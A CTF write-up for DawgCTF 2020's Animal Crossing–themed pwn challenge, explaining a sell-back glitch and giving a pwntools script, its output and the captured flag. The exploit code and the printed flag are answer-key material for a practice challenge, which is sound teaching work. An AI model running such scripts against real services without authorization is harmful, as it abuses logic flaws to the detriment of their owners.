# DawgCTF 2020

## Tom Nook the Capitalist Racoon

> 200
>
> Anyone else hear about that cool infinite bell glitch?
>
> `nc ctf.umbccd.io 4400`
>
> Author: trashcanna
> 
> [animal_crossing](animal_crossing)

Tags: _pwn_


### Analysis

#### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.  This is going to be hard...


#### Decompile with Ghidra

Nothing obvious stood out. I suppose with enough analysis one could find the bug.


#### Mess around with it, get lucky

You can do this yourself, the binary is here.  All you do is buy a tarantula, then sell it back over and over until you have enough coin (bells) to buy the flag.

_Why a tarantula?_

It has the highest value, however, you can sell back the last item in your inventory as many times as you like (tested with _flimsy net - a great way to catch bugs! Price: 400 bells_--over 1000 iterations!)


### Solution

```
from pwn import *

#p = process('./animal_crossing')
p = remote('ctf.umbccd.io', 4400)

p.recvuntil('Choice: ')
p.sendline('2')
p.recvuntil('flag - 420000 bells\n')
p.sendline('2')

for i in range(int(420000 / 8000) + 1):
    print(i)
    p.recvuntil('Choice: ')
    p.sendline('1')
    p.recvuntil('tarantula - I hate spiders! Price: 8000 bells\n')
    p.sendline('5')

p.recvuntil('Choice: ')
p.sendline('1')
p.recvuntil('tarantula - I hate spiders! Price: 8000 bells\n')
p.sendline('1')

p.recvuntil('Choice: ')
p.sendline('2')
p.recvuntil('flag - 420000 bells\n')
p.sendline('6')

p.recvuntil('Choice: ')
p.sendline('1')
_ = p.recvuntil('tarantula - I hate spiders! Price: 8000 bells\n')

print(_)
```

#### Output

```
# time ./exploit.py
[+] Opening connection to ctf.umbccd.io on port 4400: Done
0
1
...51
52
b"\n
Of course! What exactly are you\n
offering?\n
1. flag - DawgCTF{1nf1n1t3_t@rantul@$} Price: 420000 bells\n
2. olive flounder - it's looking at me funny Price: 800 bells\n
3. slingshot - the closest thing you can get to a gun Price: 900 bells\n
4. flimsy shovel - for digging yourself out of debt Price: 800 bells\n
5. tarantula - I hate spiders! Price: 8000 bells\n"

real    1m43.248s
user    0m0.476s
sys     0m0.143s
```

#### Flag

```
DawgCTF{1nf1n1t3_t@rantul@$}
```
